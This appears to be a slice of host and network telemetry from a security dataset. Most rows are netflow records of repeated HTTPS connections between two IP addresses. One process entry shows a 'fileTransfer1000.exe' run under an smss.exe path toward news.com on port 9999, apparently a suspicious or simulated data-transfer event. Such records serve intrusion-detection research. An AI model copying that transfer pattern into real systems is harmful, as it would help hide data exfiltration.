c6276338-28ed-4b24-b347-71b0c7daadaa,{'netflow': '142.20.57.246:53923->202.6.172.98:443'},849845
dbb615e3-1e9f-45f3-a926-52b00ff7ac3c,{'subject': '/SystemRoot/System32/smss.exe fileTransfer1000.exe  news.com 9999 '},6072
2ca6f0e0-c7b4-4db7-87eb-72ce7802d4dc,{'netflow': '142.20.57.246:53950->202.6.172.98:443'},853948
dfa8e8ed-aff0-4932-aca3-2e394fb2d732,{'netflow': '202.6.172.98:443->142.20.57.246:53923'},849854
86cdc47a-a13e-4bc4-a5f2-012586bfcd96,{'netflow': '142.20.57.246:53484->202.6.172.98:443'},839617
cd25fad9-f2c5-45ce-926e-8f30ffebaada,{'netflow': '202.6.172.98:443->142.20.57.246:53950'},853954
822fdbe8-d1ea-4a62-9d98-1be3d6dae5fa,{'netflow': '142.20.57.246:53249->202.6.172.98:443'},821185
d72b57fa-3a96-41f4-8b55-af004214b6c8,{'netflow': '142.20.57.246:53310->202.6.172.98:443'},825282
f6f8ac66-f791-404c-91a4-6d82d37f4234,{'netflow': '142.20.57.246:49996->202.6.172.98:443'},808901
62fc2e0c-b65f-46f5-9eb5-dd86c9aba946,{'netflow': '142.20.57.246:53952->202.6.172.98:443'},853959
4d90f34c-ced7-4265-b51c-6aa8b66f4b7e,{'netflow': '202.6.172.98:443->142.20.57.246:53484'},839626
9b0478ba-9ede-4925-82c1-a890728b74d9,{'netflow': '202.6.172.98:443->142.20.57.246:53432'},833483
5fd553a7-a99f-4d00-b375-2e956186aebd,{'netflow': '202.6.172.98:443->142.20.57.246:53952'},853962
fb2bf7eb-66c0-4324-ab27-1ec5ccea660a,{'netflow': '202.6.172.98:443->142.20.57.246:53937'},851928
9fd478e3-4cda-4b7c-92c2-266362a1558d,{'netflow': '142.20.57.246:53916->202.6.172.98:443'},847839
d1227a7d-b46c-4397-8ae5-cfb1aaa10f0c,{'netflow': '202.6.172.98:443->142.20.57.246:49996'},808929
cb99d523-2af9-42f7-933f-c365aedadf5c,{'netflow': '142.20.57.246:53497->202.6.172.98:443'},841697
3c5fb65e-4d08-43d9-a121-928d0a083a92,{'netflow': '142.20.57.246:53342->202.6.172.98:443'},827361
2e22d24d-0a6a-49dd-bf1a-ab372d4c9d91,{'netflow': '142.20.57.246:49970->202.6.172.98:443'},804834
b230dfac-242d-4b7b-9c10-d5a3a970eb62,{'netflow': '202.6.172.98:443->142.20.57.246:49970'},804837
50124e85-32e5-4673-9839-f9e88a2b7506,{'netflow': '142.20.57.246:53283->202.6.172.98:443'},823266
55a0dadd-8f8d-4476-9ccf-a4c344243ae5,{'netflow': '202.6.172.98:443->142.20.57.246:53249'},821226
aebf3477-bf87-4a40-beb9-7914d1b54a96,{'netflow': '202.6.172.98:443->142.20.57.246:53283'},823275
e47673a6-56aa-4a74-af72-1e0b4aab396c,{'netflow': '202.6.172.98:443->142.20.57.246:53341'},827370
c38a812a-74dd-456f-91b4-d2bc606f3d6b,{'netflow': '202.6.172.98:443->142.20.57.246:53310'},825333
f271f13b-31f7-4ba4-9c42-a7c1692244af,{'netflow': '142.20.57.246:53443->202.6.172.98:443'},835577
d6c30d9f-cbe0-47c5-873b-ee15996d646b,{'netflow': '142.20.57.246:54003->202.6.172.98:443'},860156
